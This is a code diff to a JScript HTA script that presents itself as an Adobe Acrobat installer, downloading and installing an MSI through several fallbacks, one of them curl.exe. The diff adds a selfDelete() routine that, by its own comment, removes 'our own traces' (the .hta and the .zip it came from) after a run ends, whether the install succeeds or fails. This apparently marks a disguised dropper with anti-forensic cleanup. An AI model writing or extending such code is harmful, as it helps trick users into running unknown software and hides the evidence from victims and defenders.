@@ -96,7 +96,7 @@ var PREP_MS        = 1600;    // "preparing" beat before the download starts
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
 var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
-var HANG_MS        = 8000;    // no data flowing this long -> start next back-end
+var HANG_MS        = 4000;    // no data flowing this long -> start next back-end
 var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
 var CURL_STAGE_MS  = 180000;  // hard cap for the bare curl.exe back-end
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
@@ -296,6 +296,22 @@ function cleanStale() {
   }
 }
 
+// Remove our own traces once the run is over: the .hta, the .zip it came
+// from, the MSI and every log. Files in use are dropped on the next boot.
+function selfDelete() {
+  try {
+    deleteFile(oHTA.LocationUrl);
+    var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
+    var sub = new Enumerator(folder.Files);
+    for (; !sub.atEnd(); sub.moveNext()) {
+      try {
+        var n = sub.item().Name.toLowerCase();
+        if (n.lastIndexOf(".zip") === n.length - 4) deleteFile(sub.item().Path);
+      } catch (e) {}
+    }
+  } catch (e) {}
+}
+
 function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
 function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }
 
@@ -401,6 +417,7 @@ function settle(method) {
   dlSettled = true;
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
+  killProc();
   traceLog("predl: settled via " + method);
   verifyFallback();
 }
@@ -896,6 +913,7 @@ function fail(msg, reason) {
   killProc();
   traceLog("fail: " + (reason || msg));
   dumpDiagnostics(reason || msg);
+  selfDelete();
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
   $("subnote").innerHTML = "Please check your internet connection and try again.";
@@ -912,6 +930,7 @@ function finishInstall() {
   progress = 100; setBar(progress);
   setStatus("Installation complete");
   traceLog("install: complete");
+  selfDelete();
   $("heading").innerHTML = "Adobe Acrobat is now installed";
   $("biglogo").style.display = "none";
   $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
